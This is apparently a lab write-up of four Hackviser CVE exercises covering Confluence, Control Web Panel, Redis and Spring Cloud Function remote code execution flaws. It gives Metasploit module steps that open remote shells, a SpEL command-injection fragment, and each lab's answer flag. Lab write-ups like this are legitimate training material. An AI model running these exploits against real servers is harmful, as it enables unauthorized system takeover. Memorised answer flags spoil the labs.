---
title: 'CVE 2022'
date: '2026-05-04'
excerpt: 'CVE-2022-26134, CVE-2022-44877, CVE-2022-0543, CVE-2022-22963'
prog: 'Hackviser CVE Labs  -  May 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_hackviser_logo.webp" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2022</h1>
<div class="writeup-date">May 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h4 class="mb-2">1. Atlassian Confluence OGNL Injection Remote Code Execution (CVE-2022-26134)</h4>
<p class="mb-3">Atlassian Confluence is a popular collaboration and wiki software used by organizations worldwide. A critical OGNL (Object-Graph Navigation Language) injection vulnerability (CVE-2022-26134) exists in Atlassian Confluence Server and Data Center starting from version 1.3.0 up to 7.18.0. An unauthenticated attacker can exploit this flaw by sending a specially crafted URI path containing OGNL expressions. This allows for full remote code execution on the server with the privileges of the Confluence application, typically allowing for complete system takeover. Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2022-26134</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-26134/cvelabs_cve-2022-26134_image1.png" alt="CVE-2022-26134 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-26134/cvelabs_cve-2022-26134_image2.png" alt="CVE-2022-26134 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Plato</p>
<br />

<h4 class="mb-2">2. Control Web Panel (CWP) Remote Code Execution (CVE-2022-44877)</h4>
<p class="mb-3">Control Web Panel (formerly known as CentOS Web Panel) is a popular open-source server management interface. In versions of CWP prior to 0.9.8.1147, a critical unauthenticated Remote Code Execution vulnerability (CVE-2022-44877) exists in the login/index.php component. The vulnerability occurs because the login parameter is improperly sanitized before being passed to a backend bash script used for logging, allowing attackers to execute arbitrary system commands. Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2022-44877</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-44877/cvelabs_cve-2022-44877_image1.png" alt="CVE-2022-44877 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Command shell session will open and we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-44877/cvelabs_cve-2022-44877_image2.png" alt="CVE-2022-44877 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Altair</p>
<br />

<h4 class="mb-2">3. Redis Lua Sandbox Escape Remote Code Execution (CVE-2022-0543)</h4>
<p class="mb-3">Redis is a widely used open-source, in-memory data structure store, used as a database, cache, and message broker. This laboratory covers the critical CVE-2022-0543 vulnerability detected in Redis packages on Debian/Ubuntu-based distributions. The vulnerability stems from an issue in the packaging process where the Lua Sandbox is not sufficiently isolated. Normally, Redis limits the execution of system commands via Lua scripts. However, due to this packaging flaw, the <code>package.loadlib</code> function remains accessible. Unauthenticated attackers can abuse this function to load dynamic libraries and execute arbitrary system commands on the server without needing valid credentials. Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside?</p>
<p class="mb-3"><strong>Steps: </strong>First we use Metasploit via <code>msfconsole</code>. Run <code>search CVE-2022-0543</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-0543/cvelabs_cve-2022-0543_image1.png" alt="CVE-2022-0543 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Once the command shell opens, we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-0543/cvelabs_cve-2022-0543_image2.png" alt="CVE-2022-0543 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Tungsten</p>
<br />

<h4 class="mb-2">4. Spring Cloud Function SpEL Injection Remote Code Execution (CVE-2022-22963)</h4>
<p class="mb-3">Spring Cloud Function is a framework that allows developers to write cloud-agnostic business logic as functions. It abstracts transport details, enabling a "Serverless" architecture in Java. This laboratory focuses on CVE-2022-22963, a critical Remote Code Execution (RCE) vulnerability. The core issue lies within the RoutingFunction component. When a request is received, the application looks for the <code>spring.cloud.function.routing-expression</code> HTTP header to determine which function should handle the data. In vulnerable versions, this header's content is passed to the Spring Expression Language (SpEL) engine using a StandardEvaluationContext. Unlike the restricted <code>SimpleEvaluationContext</code>, the Standard context allows full access to the Java API. This means an attacker can inject code like <code>T(java.lang.Runtime).getRuntime().exec(...)</code> into the header, forcing the server to execute arbitrary system commands before the data is even processed. Exploit the vulnerability to read the /secret.txt file on the server. What is the secret content?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2022-22963</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-22963/cvelabs_cve-2022-22963_image1.png" alt="CVE-2022-22963 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> and read the secret file.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2022/cve-2022-22963/cvelabs_cve-2022-22963_image2.png" alt="CVE-2022-22963 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Ganymede</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>